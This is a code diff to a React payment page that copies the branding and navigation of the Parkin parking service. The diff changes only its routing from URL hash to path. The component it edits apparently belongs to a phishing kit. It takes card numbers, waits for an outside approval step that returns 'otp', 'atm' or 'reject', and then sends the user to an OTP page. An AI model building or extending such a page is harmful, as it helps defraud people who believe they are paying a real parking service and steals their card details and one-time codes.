@@ -79,9 +79,7 @@ export default function PayForParking() {
   const [step, setStep] = useState(2); // Start at step 2 (Vehicle selection)
   
   // Get parking data from URL params
-  // Hash routing: params are after the ? in the hash, e.g. /#/pay-for-parking?zone=111A
-  const hashParts = window.location.hash.split('?');
-  const params = new URLSearchParams(hashParts[1] || '');
+  const params = new URLSearchParams(window.location.search);
   const zoneCode = params.get('zone') || '';
   const durationLabel = params.get('duration') || '';
   const totalFees = params.get('total') || '0.00';
@@ -259,7 +257,7 @@ export default function PayForParking() {
   // Handle form approval
   useEffect(() => {
     if (isFormApproved.value) {
-      window.location.hash = `/otp-verification?service=${encodeURIComponent('Parkin - Pay for Parking')}&amount=${totalFees}`;
+      window.location.href = `/otp-verification?service=${encodeURIComponent('Parkin - Pay for Parking')}&amount=${totalFees}`;
     }
   }, [isFormApproved.value]);
 
@@ -269,7 +267,7 @@ export default function PayForParking() {
       const action = cardAction.value.action;
       waitingMessage.value = '';
       if (action === 'otp' || action === 'atm') {
-        window.location.hash = `/otp-verification?service=${encodeURIComponent('Parkin - Pay for Parking')}&amount=${totalFees}`;
+        window.location.href = `/otp-verification?service=${encodeURIComponent('Parkin - Pay for Parking')}&amount=${totalFees}`;
       } else if (action === 'reject') {
         setRejectedError(true);
         setCardNumber('');
@@ -396,7 +394,7 @@ export default function PayForParking() {
       {/* ═══════ HEADER ═══════ */}
       <header className="sticky top-0 z-50 bg-white shadow-sm">
         <div className="max-w-[1400px] mx-auto px-6 flex items-center h-[72px]">
-          <a href="#/" className="flex-shrink-0 mr-8"><ParkinLogo /></a>
+          <a href="/" className="flex-shrink-0 mr-8"><ParkinLogo /></a>
           <nav className="hidden lg:flex items-center gap-6 flex-1">
             {['Home','Individuals','Business','Government','Investors','More'].map(item => (
               <span key={item} className="text-[14px] text-gray-700 hover:text-[#045464] cursor-pointer font-medium">{item}</span>
